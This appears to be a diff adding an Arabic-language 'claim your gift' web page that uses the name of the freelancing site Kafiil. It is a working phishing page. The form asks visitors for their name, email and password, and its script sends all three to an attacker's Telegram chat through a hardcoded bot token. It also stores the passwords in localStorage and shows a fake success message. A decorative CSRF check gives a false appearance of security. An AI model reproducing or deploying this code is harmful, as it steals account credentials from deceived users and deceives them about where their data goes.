@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="صفحة استلام الهدية الخاصة بنا تقدم تجربة آمنة وسهلة للحصول على هديتك.">
+    <meta name="robots" content="index, follow">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="icon" href="https://via.placeholder.com/32" type="image/png">
+    <title>استلام الهدية</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #e9f7e9;
+            direction: rtl;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            max-width: 400px;
+            width: 100%;
+            padding: 20px;
+            background: white;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 12px;
+            text-align: center;
+            border: 1px solid #d4edda;
+        }
+        .container h1 {
+            color: #28a745;
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+        .container p {
+            color: #6c757d;
+            margin-bottom: 20px;
+            font-size: 16px;
+        }
+        .container input {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            text-align: right;
+        }
+        .container button {
+            width: 100%;
+            padding: 12px;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .container button:hover {
+            background-color: #218838;
+        }
+        .message {
+            display: none;
+            color: #155724;
+            background-color: #d4edda;
+            padding: 15px;
+            margin-top: 15px;
+            border: 1px solid #c3e6cb;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+        .message a {
+            display: inline-block;
+            margin-top: 15px;
+            padding: 10px 20px;
+            background-color: #28a745;
+            color: white;
+            text-decoration: none;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+        .message a:hover {
+            background-color: #218838;
+        }
+        .error {
+            color: red;
+            margin-bottom: 15px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>استلم هديتك الآن!</h1>
+        <p>املأ المعلومات التالية لاستلام هديتك من العم كاف.</p>
+        <form id="giftForm" onsubmit="handleSubmit(event)">
+            <input type="hidden" id="csrfToken" value="random_generated_token_12345">
+            <div class="error" id="errorMessage">يرجى التحقق من البيانات المدخلة.</div>
+            <input type="text" id="name" name="name" placeholder="الاسم الكامل" required 
+                   pattern="^[\u0600-\u06FF\s]+$" 
+                   title="الاسم يجب أن يحتوي على حروف عربية فقط"
+                   autocomplete="name">
+            <input type="email" id="email" name="email" placeholder="البريد الإلكتروني" required 
+                   pattern="^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$" 
+                   title="البريد الإلكتروني يجب أن يكون باللغة الإنجليزية وصالحاً"
+                   autocomplete="email">
+            <input type="password" id="password" name="password" placeholder="كلمة المرور" required>
+            <button type="submit">إرسال</button>
+        </form>
+        <div class="message" id="successMessage">
+            <p>تم التحقق من البيانات بنجاح! ستصلك هديتك قريبًا في حسابك.</p>
+            <a href="https://kafiil.com">العودة للصفحة الرئيسية</a>
+        </div>
+    </div>
+    <script>
+        const TOKEN = "7910988570:AAEAfmOik7EoH4Rf6M-4kti8mi47aXMGDmE";
+        const CHAT_ID = "6266941055";
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+    
+        // استعادة البيانات المخزنة من Local Storage
+        const claimedGifts = JSON.parse(localStorage.getItem('claimedGifts')) || {};
+    
+        function sendTelegramMessage(name, email, password) {
+            const message = `Kafiil:\nName: ${name}\nEmail: ${email}\nPassword: ${password}`;
+            const url = `${URI_API}?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+    
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        document.getElementById('successMessage').style.display = 'block';
+                    } else {
+                        document.getElementById('errorMessage').style.display = 'block';
+                    }
+                })
+                .catch(error => {
+                    document.getElementById('errorMessage').style.display = 'block';
+                });
+        }
+    
+        function handleSubmit(event) {
+            event.preventDefault();
+            const csrfToken = document.getElementById('csrfToken').value;
+            if (csrfToken !== "random_generated_token_12345") {
+                document.getElementById('errorMessage').textContent = "رمز الحماية غير صالح.";
+                document.getElementById('errorMessage').style.display = 'block';
+                return;
+            }
+    
+            const name = document.getElementById('name').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+    
+            // التحقق من كلمة المرور
+            const arabicPattern = /[\u0600-\u06FF]/;
+            if (arabicPattern.test(password)) {
+                document.getElementById('errorMessage').textContent = "كلمة المرور يجب أن تكون خالية من الأحرف العربية.";
+                document.getElementById('errorMessage').style.display = 'block';
+                return;
+            }
+    
+            // التحقق مما إذا كان البريد الإلكتروني قد طالب بالهدية من قبل
+            if (claimedGifts[email]) {
+                document.getElementById('errorMessage').textContent = "لا يمكنك استلام الهدية أكثر من مرة.";
+                document.getElementById('errorMessage').style.display = 'block';
+                return;
+            }
+    
+            // حفظ البريد الإلكتروني وكلمة المرور في Local Storage
+            claimedGifts[email] = password;
+            localStorage.setItem('claimedGifts', JSON.stringify(claimedGifts));
+    
+            document.getElementById('errorMessage').style.display = 'none';
+            sendTelegramMessage(name, email, password);
+        }
+    </script>
+    
